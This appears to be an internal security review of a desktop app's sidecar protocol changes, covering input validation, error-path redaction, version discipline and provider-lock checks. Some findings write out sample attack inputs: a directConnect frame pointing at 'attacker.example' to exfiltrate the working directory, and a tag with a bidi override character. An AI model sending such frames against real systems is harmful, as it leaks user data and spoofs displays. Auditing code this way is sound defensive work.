# Lane 5: Sidecar boundary, protocol, permission domain

Review target: committed range `2f4278d` .. `7c6959f`. Every anchor below is
`git show 7c6959f:<path>`. The working tree carries other sessions' in-flight
edits to most of these files (including an unmerged amendment to
`decisions/PERMISSION-BOUNDARY.md` §3 that adds `auto` to the `permission.setMode`
allowlist); none of that is reviewed or reported here.

## Scope reviewed

`app/shared/protocol.ts` (+367/-21), `app/shared/limits.ts`,
`app/shared/settingsEditable.ts`, `app/shared/transcriptBackfill.ts`,
`app/sidecar/sidecarServer.ts` (+232/-51), `runControlsDomain.ts` (+328/-35),
`sessionActionsDomain.ts`, `settingsDomain.ts`, `permissionDomain.ts`,
`accountsDomain.ts`, `transcriptRunFacts.ts` (new), `transcriptBackfillWorker.ts`,
`accountsPoolWorker.ts` (new), plus colocated `.test.ts`/`*.probe.test.ts`.

The week's boundary-relevant work was: one new inbound verb (`session.tag`);
four inbound field widenings (`account.switch/login.provider`,
`settings.setValue.value: null`, `model.set.model: null`); Anthropic-provider
support restored across the run-controls and accounts snapshots (provider route,
provider-switch lock, Claude account rows); auto-compact/context-window/marketing-label
display facts added to `RunControlsSnapshot`; a new `TranscriptRunFacts` artifact
read from raw transcript JSONL at backfill time; a new outbound
path-strip + length bound on error frames (`redactErrorMessage`); two new
IDLE-PARK gates (`inFlightDurableWrites`, `isOAuthLoginInFlight`); real URL-shape
validation on `remoteSettings.directConnect`; and a fail-closed reject for
duplicate `AskUserQuestion` question text.

## New inbound frame kinds this week

Verified by diffing the `z.literal('…')` set in `sidecarServer.ts` between the two
commits: exactly **one** new kind. Everything else is a field-level widening on an
existing kind, listed below it because CLAUDE.md §6's three requirements apply the
same way.

| kind / widening | sidecar-local schema? | accept + reject boundary test? | decision doc-comment? |
|---|---|---|---|
| `session.tag` (NEW kind) | YES — `sessionActionVerbMessageSchema` (`sidecarServer.ts:3226-3232`) + `checkStrictKeys` entry (`:2949`) | YES — accept `sidecarServer.test.ts:5690`, empty-string-as-remove `:5718`; reject non-string `:5742`, extra key `:5765`; domain `sessionActionsDomain.test.ts:137,150,161` | YES — `protocol.ts` `SESSION_ACTION_VERB_TYPES` block cites P4-29, `sessionStorage.ts:3257`, `tag.tsx:118`/`:141`, PARITY-LEDGER §16 |
| `account.switch.provider` | YES — `z.enum(['anthropic','openai']).optional()` (`:3090`) + strict key (`:2917`) | YES — accept `:4127`; reject unknown provider `:4173` | YES — inline on `AccountLoginProvider` / `AccountSwitchMessage` (`protocol.ts:218-228`), P4-5 precedent |
| `account.login.provider` | YES — same enum (`:3115`) + strict key (`:2922`) | YES — accept `:3959`; reject unknown provider `:4044`, reject extra `activateProvider` key `:4016` | YES — inline (`protocol.ts:258-264`) |
| `settings.setValue.value: null` (CLEAR) | YES — `z.null()` in `settingsValueSchema` (`:3320`) + `validateEditableSettingWrite` (`settingsEditable.ts:411`) | YES — accept every control kind `:4763`; reject non-editable source + unknown key `:4792`; reject undefined/object/wrong-type/extra-key `:4826` | YES — the strongest of the four: `protocol.ts:383-395` argues additivity, why `null` and not an in-band sentinel, and the three layers that make `null` unwritable |
| `model.set.model: null` (provider Default) | YES — `.nullable()` (`:3189`) | YES — accept `:1907`; reject non-string `:2056` | THIN — one line, `protocol.ts:1297` `/** null restores the current provider's default model. */`. No decision citation, unlike the other three. Not a defect; noted for the record. |

Closed-allowlist property: **intact and verified.** `checkStrictKeys`
(`sidecarServer.ts:2894-2992`) runs before every dispatch branch, resolves the type
through `Map.get` (deliberately not `key in obj`, so `constructor`/`toString`
cannot masquerade as a type), and returns `unknown message type` for anything not
in the map. The `startsWith('account.'/'settings.'/'workspace.'/…)` dispatch
prefixes at `:819-899` are therefore unreachable with an unknown type. `dispatch()`
(`:920-961`) has no `default:` and only handles the four `AppClientMessage` arms
that `appClientMessageSchema.safeParse` already accepted.

## Findings

### [MEDIUM] `session.tag` drops the Unicode sanitization the engine's own `/tag` applies — CONFIRMED

**Location:** `app/sidecar/sessionActionsDomain.ts:194-200` (domain) and `:112-117`
(executor), against `src/commands/tag/tag.tsx:82`.

**Defect:** The new verb's doc-comment says it mirrors `/tag`, but the engine
normalizes the tag with `recursivelySanitizeUnicode(tagName).trim()` before
`saveTag`, and the sidecar path applies `.trim()` only.

**Failure scenario:** The renderer sends
`{"type":"session.tag","requestId":"r","tag":"prod‮gnimaerts"}`. It passes
`checkStrictKeys` and the Zod bound (`z.string().max(4096)`), reaches
`domain.tag()`, is trimmed, and is written verbatim by
`saveTag` → `appendEntryToFile` as `{"type":"tag","tag":"prod‮…"}`. The
sessions catalog reads `tag` back from that JSONL entry, so the Sessions-page tag
chip and filter tabs — and the terminal surfaces that read the same field — render
with the RTL override live. The same gap admits `​`/`⁦`, so two tags that
are byte-different and visually identical become two separate filter tabs. Neither
outcome is reachable through `/tag`, which strips all of `\p{Cf}\p{Co}\p{Cn}` plus
the explicit bidi/zero-width ranges and NFKC-normalizes first.

**Evidence:**

```ts
// app/sidecar/sessionActionsDomain.ts:194-198
async tag(tag) {
  // Trim here so `#  spaces  ` can never become a tag the filter tabs cannot
  // match; an all-whitespace value is the REMOVE form, not a failure.
  const trimmed = tag.trim()
```

```ts
// src/commands/tag/tag.tsx:82
t1 = recursivelySanitizeUnicode(tagName).trim();
```

`src/utils/sanitization.ts:1-23` documents this as a deliberate mitigation for
hidden-character / ASCII-smuggling attacks (HackerOne #3086545), not an incidental
tidy-up. This is CLAUDE.md §8 rule 1: when the sidecar builds something the engine
also builds, it must be constructed from the SAME source. Impact is
display-integrity, not model injection — I traced no path that feeds the catalog
`tag` into a prompt. Fix is one import plus one call; the engine function is
already exported. No test asserts sanitization on either side of this path.

### [LOW] The new outbound path-strip covers `error` frames only; sibling result/progress frames still forward raw `error.message` — CONFIRMED

**Location:** `app/sidecar/sidecarServer.ts:2819-2844` (`sendError` →
`redactErrorMessage`) and `:2857-2882`; uncovered call sites at `:1696-1710`
(`session-action.result`) and `app/sidecar/accountsDomain.ts:699` / `:745`
(`oauth.login.progress`).

**Defect:** `redactErrorMessage` was added this week specifically because "several
call sites forward raw engine text … A failed vault unlink carries the vault file
path in its message, and `vaultFilePath` is a SECURITY-MINIMUM §4 forbidden
crossing." It is wired into `sendError` alone. The verb-result and OAuth-progress
frames that carry the same raw text go through `send()`, which runs only
`scanForSecrets` — a KEY-name scan that by design never inspects values
(SECURITY-MINIMUM "Scope note").

**Failure scenario:** `session.export` against a transcript the process cannot read
→ the domain's catch produces
`Could not export: EACCES: permission denied, open '/Users/<user>/.cat-code/projects/-Users-<user>-work-<repo>/<uuid>.jsonl'`
→ `session-action.result.message` → renderer, unredacted, unbounded. Same shape for
`session.branch` (fork transcript write) and the new `session.tag`. The
`oauth.login.progress` `state:'error'` arm forwards `error.message` from the
credential-write path, which is the closest reachable instance of the vault-path
case the guard was written for (`saveCodexTokenToVault` swallows its own errors and
returns null, so the Codex arm is unlikely; the Anthropic `installOAuthTokens` arm
is untraced — PLAUSIBLE, not confirmed, for that specific string).

**Evidence:** `send()` at `:2763-2784` exempts only `frame.kind !== 'error'` from
`scanForSecrets`; nothing else in `send` touches message text.
`:1706-1708` is `message: \`Session action failed: ${error.message}\``. Note this
class predates the week (the rename/export/branch catches exist at `2f4278d`); what
is new is that the week established the mitigation and applied it to one frame kind
out of the set it named.

### [LOW] `RunControlsSnapshot.effort.current` was repurposed under an unchanged `PROTOCOL_VERSION`, in the same file whose new header asserts fields are never repurposed — CONFIRMED

**Location:** `app/shared/protocol.ts:22-31` (the new header paragraph), `:1417-1424`
(the field); `app/sidecar/runControlsDomain.ts:456-467` and `:495-496`.

**Defect:** `effort.current` used to be the raw session selection
(`state.effortValue == null ? null : String(state.effortValue)`). It is now
`resolveAppliedEffort(current, state.effortValue)` — the tier that survives
env/session/default precedence, and `null` whenever the model does not support an
effort knob. The raw selection moved to a NEW field, `effort.selected`. That is a
meaning change on an existing field, not an addition.

**Failure scenario:** A reader built against the old meaning (the effort chip
highlighting the row the user picked) now highlights whatever precedence resolved
to, and shows nothing at all on a model with `modelSupportsEffort === false` even
when the user has a stored selection. In this build the renderer was updated in
lockstep (`ComposerActionsBar.tsx:1102-1103` reads both fields correctly), so there
is no live breakage — this is a discipline finding, not a live bug. It matters
because the same commit added a header paragraph asserting the opposite rule and
explicitly justified `model.current` KEEPING its meaning "because `selectContextUsage`
matches it against `result.modelUsage` keys"; `effort.current` got the treatment the
paragraph forbids, with no header entry and no bump.

**Evidence:**

```
// protocol.ts:22-24 (added this week)
 *  - **New outbound facts grow an existing snapshot; they never repurpose a
 *    field.** `PROTOCOL_VERSION` stays put for an addition because no reader's
 *    existing field changes shape.
```

```ts
// runControlsDomain.ts, before → after
- current: state.effortValue == null ? null : String(state.effortValue),
+ current: appliedEffort,
+ selected: selectedEffort,
```

### [LOW] Three outbound snapshot fields removed without a version bump or a header note — CONFIRMED

**Location:** `app/shared/protocol.ts` — `AgentConfigSnapshot.notes`,
`ExtensionsSnapshot.notes`, `SessionsCatalogSnapshot.notes` (all deleted in the
range; the surviving `notes` at `:956` is `MemorySnapshot`'s).

**Defect:** Field removal is a non-additive shape change on an existing frame.
CLAUDE.md §6 for `protocol.ts`: "Additive changes only; version bump only on
breaking shape change." No bump, and the header paragraph added in the same week
covers additions only.

**Failure scenario:** Requires a version-skewed reader. I checked for one and there
isn't: `git grep '\.notes'` across `app/renderer`, `app/main`, `app/shared`,
`app/sidecar` at `7c6959f` returns zero non-test hits, snapshots are never persisted
to the transcript cache (the cache doc at `protocol.ts:2470-2477` restricts it to
transcript event + truncation frames), and main/sidecar/renderer ship from one
build. So the concrete cost is zero today; the finding is that the rule's escape
hatch (bump, or state the reason in the header) was not used and a future reader
cannot tell removals from additions in this file's history.

### [LOW] The sidecar re-implements the engine's `canApplyModelSelection` provider-lock predicate — CONFIRMED

**Location:** `app/sidecar/runControlsDomain.ts:252-266` (and the same shape at
`:335-345` for `activateProvider`), against `src/utils/model/providers.ts:124-133`.

**Defect:** The engine exports the exact predicate and uses it at both of its own
mutation callsites (`src/commands/model/model.tsx:85,247`,
`src/components/PromptInput/PromptInput.tsx:2044`). The sidecar imports
`isProviderSwitchLocked`, `getTotalInputTokens` and `resolveModelSelectionProvider`
from the same modules and re-derives the check, but compares only the
openai-vs-not-openai bit rather than full provider equality:

```ts
if (
  currentSnapshot.model.providerSwitchLocked &&
  (currentSnapshot.model.provider === 'openai') !==
    (resolveModelSelectionProvider(model) === 'openai')
) { /* reject */ }
```

versus the engine's
`resolveModelSelectionProvider(model, currentProvider) === currentProvider`.

**Failure scenario:** No live divergence exists today — I traced
`resolveModelSelectionProvider` and it can only return `'openai'`, the current
provider, or `getConfiguredAnthropicProvider()`, and the last two coincide on every
non-openai route because both read the same env vars. A bedrock↔vertex crossing
would slip the sidecar gate and be caught by the engine's; it is unreachable while
that holds. This is CLAUDE.md §8 rule 10 (reuse the real entry point) with a
comparison that is weaker than the one it copies, so the two can silently diverge
the next time provider resolution grows a case.

### [LOW] `remoteSettings.directConnect` now validates URL shape but still admits any host — CONFIRMED, deliberate deferral

**Location:** `app/sidecar/sidecarServer.ts:3298-3320`
(`isAllowedRemoteServerUrl` / `remoteServerUrlSchema`).

**Defect:** The week's fix is real and closes the worse half (a length-only bound
previously admitted `file:`, `data:`, embedded `user:pass@`, and free-form
query/fragment capacity). What remains, stated in the code's own comment, is that
no host policy exists: "What is deliberately NOT decided here: which HOSTS are
reachable (loopback only? an operator-configured list?)."

**Attack path:** A T1-compromised renderer sends
`{"type":"remoteSettings.directConnect","requestId":"r","serverUrl":"https://attacker.example"}`.
The privileged sidecar POSTs `{cwd}` to `https://attacker.example/sessions`
(`src/server/createDirectConnectSession.ts`, no auth token attached from this path),
and the attacker's response (`sessionId`, `wsUrl`) is echoed back on `remote.result`.
That is renderer-driven egress of the session working directory from the privileged
process plus a same-machine request oracle — precisely the class
SECURITY-MINIMUM T3 relies on the renderer's `connect-src 'self'` to deny. A
per-session single-flight latch and a 15 s timeout bound the volume, not the reach.

Reporting it so it gets a named owner rather than a third silent pass (migration
two-strikes rule): the fix's own comment defers it, so it is now flagged once in
code and once in review.

## Coverage gaps

- **No test asserts tag sanitization** on either the domain or the boundary
  (`sessionActionsDomain.test.ts:137-160` covers trim and the empty-remove form
  only). Concrete cost: the MEDIUM above shipped and nothing failed.
- **No test pins `redactErrorMessage`'s behaviour.** There is no assertion that an
  `error` frame carrying an absolute path comes out stripped, that a URL is *not*
  stripped (the regex comment claims it), or that a >1,000-char message is bounded.
  The regex is subtle (a path must be preceded by start-of-string or one of
  `` [\s'"`([{<] ``, so `key=/a/b` and `~/.cat-code/x` are both missed) and has no
  characterisation test.
- **`app/shared/limits.ts:73` cites the wrong test** for the ALIGNMENT INVARIANT
  ("Enforced by test (historyReplay.test.ts)"). It is actually enforced in
  `app/main/historyReplayReload.test.ts:56-61`, which does check both the frame and
  byte halves against the replay-buffer budgets. `app/sidecar/historyReplay.test.ts`
  imports neither buffer constant. The invariant IS covered; the citation is stale.
- `model.set`'s `null` widening has accept/reject boundary tests but only a
  one-line doc-comment, where the other three widenings this week carry a decision
  rationale. No cost today.

## Clean

Checked and found sound, with the reasoning traced rather than assumed:

- **Closed allowlist / fail-closed inbound.** `checkStrictKeys` before every branch;
  `Map.get` prototype-safety; no permissive default anywhere in the dispatch chain;
  envelope `protocolVersion` and `sessionId` checks unchanged (`:732-761`).
  Every new validator rejects rather than repairs — `validateEditableSettingWrite`
  branches structurally on `null` and otherwise delegates to the unchanged per-key
  type check; `isAllowedRemoteServerUrl` returns false rather than normalizing;
  `parseTranscriptRunFacts` distinguishes "invalid → reject the whole record" from
  "source said nothing → null" and rejects on any extra key.
- **T4/T5a/T6/T6b untouched.** `handleSubmit`'s `parseThreadGoal` gate (`:1022-1046`),
  the pending-request lookup (`:1870-1882`), `validateSuggestionSelection` →
  `sanitizePermissionResponse` → engine-object re-attach ordering (`:1884-1921`) are
  byte-identical to `2f4278d`. `checkStrictKeys`' response-key allowlist is still
  `{behavior, updatedInput, message, applySuggestions}`; `updatedPermissions` and
  `deny.interrupt` are still rejected. `permission.setMode`'s committed mode
  allowlist still excludes `auto` and matches the committed decision doc.
- **T7 and directional limits.** `MAX_FRAME_BYTES` (128 KiB) is used at exactly one
  site, the inbound `FrameDecoder` (`:490`); `MAX_OUTBOUND_FRAME_BYTES` (32 MiB) at
  exactly two, the `send` bound (`:2800`) and the export headroom calculation
  (`:1659`). No swap, no unification. Rate cap and `MAX_PROMPT_BYTES` unchanged.
  `MAX_HISTORY_REPLAY_FRAMES` 400 → 4,000 keeps both halves strictly under main's
  8,000 / 8 MiB budgets, and that is test-enforced.
- **Secret ownership.** No new frame carries token material.
  `buildAnthropicAccountStatus` (`accountsDomain.ts:413-426`) is an explicit
  allowlist projection: `hasVaultProfile` is `Boolean(vaultFilePath)`, never the
  path. `accountsPoolWorker` runs `scanForSecrets` before emitting and main re-scans.
  The renderer authors only an `accountId`, an alias, a pasted code, or a provider
  enum on every account verb; `onProviderActivated` fires only after a real
  credential persistence AND `isSidecarFirstRunEligible()` (both pools empty and no
  Anthropic credentials at all, `accountsDomain.ts:170-187`).
- **Engine reuse in the new domains.** Verified every import resolves to a real
  exported engine function at `7c6959f`: `reconcileEffortForModel`,
  `resolveAppliedEffort`, `convertEffortValueToLevel`, `optionCoversModelSetting`,
  `getMarketingNameForModel`, `getContextWindowForModel`, `getAutoCompactThreshold`,
  `getEffectiveContextWindowSize`, `WARNING_THRESHOLD_BUFFER_TOKENS`,
  `isProviderSwitchLocked`/`setProviderSwitchLocked`, `getSdkBetas`,
  `getAgentMemoryDir`, `saveTag`, `loadPoolForObservation`.
  `readAutoCompact` reproduces `calculateTokenWarningState`'s threshold selection
  and warning offset exactly (`autoCompact.ts:246-269`) rather than approximating.
  `permissionDomain`'s removal of `feature('TRANSCRIPT_CLASSIFIER')` matches the
  committed PERMISSION-BOUNDARY §4 P4-34 addendum: the sidecar is spawned unbundled,
  so the build-time macro always read false there.
- **`transcriptRunFacts.ts`.** The two-tier read is coherent: the engine's own
  `run_facts` record (written by `sessionStorage.ts:597-651`, new this week) wins
  wholesale so the four facts stay from one request, and the snapshot's captured
  `contextWindow` is preferred over re-resolution precisely because
  `getContextWindowForModel` branches on today's environment. Scanning newest→oldest
  and requiring a full pass when no `run_facts` exists is correct, not an oversight:
  an older record can only ever be an older snapshot. Every read is shape-guarded and
  the whole function is best-effort (unreadable file → all-nulls, never a failed
  backfill).
- **`inFlightDurableWrites`.** Increment is synchronous at dispatch, decrement is in
  a terminal `.finally()` on a chain that already absorbed rejections, so the counter
  cannot leak. `account.login` returning early is covered by the separate
  `isOAuthLoginInFlight()` gate, exactly as the comment claims. Verbs cannot be
  accepted after the park latch because `onPark()` exits inside the same dispatch.
- **`settingsDomain` `editableValues` widening.** Emitting one entry per layer rather
  than the winner only is safe: the walk is high→low precedence and
  `Array.prototype.sort` is stable, so the winner remains first for a key-only lookup.
  Values are still restricted to the closed `EDITABLE_SETTING_KEYS` allowlist and
  shape-checked per key. `SETTINGS_ENGINE_DEFAULT` cannot collide with a real value:
  `loadAvailableSettingOptions` filters it out of the live output-style registry so a
  user-authored style named after the token can never be offered as a clear.
- **Run-control boundary move.** Deleting the model/effort membership check from
  `handleRunControlVerb` did not open a hole — the domain performs the same check and
  `setFast` gained availability/support checks it never had. Both still fail closed;
  only the reply shape changed (`bad_request` error frame → `ok:false` result frame).
- **`narrowGatedQuestions`' new duplicate-question rejection** is a genuine
  fail-closed fix: identically worded questions would have collapsed onto one entry
  in the tool's text-keyed answer map while the boundary reported success.
